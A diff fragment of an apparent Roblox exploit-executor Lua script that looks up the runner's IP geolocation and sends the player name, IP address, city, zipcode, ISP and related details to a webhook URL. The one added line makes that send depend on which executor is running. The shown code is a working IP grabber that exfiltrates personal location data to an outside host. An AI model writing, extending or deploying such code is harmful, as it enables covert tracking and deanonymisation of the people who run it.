@@ -7,6 +7,7 @@ local ip_info = syn.request({
 })
 local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
 local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
+if (not is_sirhurt_closure) and (syn and syn.protect_gui) then
 request(
     {
         Url = webhook_url,
